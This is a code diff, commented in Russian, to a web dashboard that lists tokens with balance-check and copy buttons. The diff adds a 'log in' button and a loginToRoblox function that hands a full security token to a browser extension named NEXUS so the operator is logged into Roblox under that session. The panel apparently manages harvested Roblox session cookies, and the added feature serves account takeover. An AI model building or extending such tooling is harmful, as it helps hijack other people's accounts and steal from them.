@@ -87,6 +87,7 @@ function renderTokens() {
     html += '<button class="copy-btn" onclick="checkSingle(\'' + fileId.replace(/'/g, "\\'") + '\')" style="font-size:0.72rem;">💰 Проверить</button>';
     if (t.security) {
       html += '<button class="copy-btn" onclick="copyText(\'' + tokenFull.replace(/'/g, "\\'") + '\')" style="font-size:0.72rem;">📋 Копировать</button>';
+      html += '<button class="copy-btn" onclick="loginToRoblox(\'' + tokenFull.replace(/'/g, "\\'") + '\', this)" style="font-size:0.72rem; background:rgba(34,197,94,0.12); color:#22c55e; border:1px solid rgba(34,197,94,0.15);">👤 Войти</button>';
     }
     html += '</div></td>';
     html += '</tr>';
@@ -157,6 +158,36 @@ function copyText(text) {
     document.body.removeChild(ta);
     toast('📋 Скопировано');
   });
+}
+
+// ── Вход в Roblox по токену ───────────────────────────────────────────────────
+function loginToRoblox(token, btn) {
+  if (!token) return;
+  btn.textContent = '⏳...';
+  btn.disabled = true;
+
+  function handler(e) {
+    if (e.data && e.data.type === 'nexus-login-response') {
+      window.removeEventListener('message', handler);
+      if (e.data.ok) {
+        btn.textContent = '👤 Войти';
+        btn.disabled = false;
+        toast('✅ Вход выполнен, открываем Roblox...');
+      } else {
+        btn.textContent = '👤 Войти';
+        btn.disabled = false;
+        toast('⚠️ Установи расширение NEXUS для входа', 'err');
+      }
+    }
+  }
+  window.addEventListener('message', handler);
+  window.postMessage({ type: 'nexus-login', token }, '*');
+  setTimeout(() => {
+    window.removeEventListener('message', handler);
+    btn.textContent = '👤 Войти';
+    btn.disabled = false;
+    toast('⚠️ Установи расширение NEXUS для входа', 'err');
+  }, 800);
 }
 
 // ── Сортировка ────────────────────────────────────────────────────────────────
